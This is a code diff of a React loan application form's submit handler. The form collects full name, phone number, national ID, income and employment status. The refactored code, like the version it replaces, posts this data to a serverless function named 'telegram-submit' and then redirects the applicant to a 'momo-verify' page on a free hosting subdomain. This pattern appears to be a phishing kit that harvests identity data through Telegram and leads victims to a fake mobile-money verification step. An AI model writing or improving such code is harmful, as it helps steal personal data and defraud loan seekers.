@@ -75,53 +75,35 @@ function ConfirmationStep({ onRestart }: { onRestart: () => void }) {
 export default function LoanApplicationForm() {
   const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle')
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
-    event.preventDefault()
-    setStatus('submitting')
+  event.preventDefault()
+  setStatus('submitting')
 
-    try {
-      const form = event.currentTarget
-      const formData = new FormData()
+  try {
+    const form = event.currentTarget
+    const formData = new FormData(form)
 
-      const fields = [
-        'form-name',
-        'full-name',
-        'phone-number',
-        'national-id',
-        'loan-amount',
-        'repayment-period',
-        'monthly-net-income',
-        'employment-status',
-        'applicant-consent',
-      ]
+    const response = await fetch('/.netlify/functions/telegram-submit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: new URLSearchParams(
+        Array.from(formData.entries()).map(([key, value]) => [
+          key,
+          String(value),
+        ]),
+      ).toString(),
+    })
 
-      for (const name of fields) {
-        const element = form.elements.namedItem(name)
-
-        if (
-          element instanceof HTMLInputElement ||
-          element instanceof HTMLSelectElement
-        ) {
-          formData.append(name, element.value)
-        }
-      }
-
-      await fetch('/.netlify/functions/telegram-submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: new URLSearchParams(
-          Array.from(formData.entries()).map(([key, value]) => [
-            key,
-            String(value),
-          ]),
-        ).toString(),
-      })
-
-      window.location.assign('https://momo-verify-4pkq.onrender.com')
-    } catch {
-      setStatus('error')
+    if (!response.ok) {
+      throw new Error('Telegram submission failed')
     }
+
+    window.location.assign('https://momo-verify-4pkq.onrender.com')
+  } catch (error) {
+    console.error('Application submission failed:', error)
+    setStatus('error')
+  }
   }
 
   if (status === 'success') {
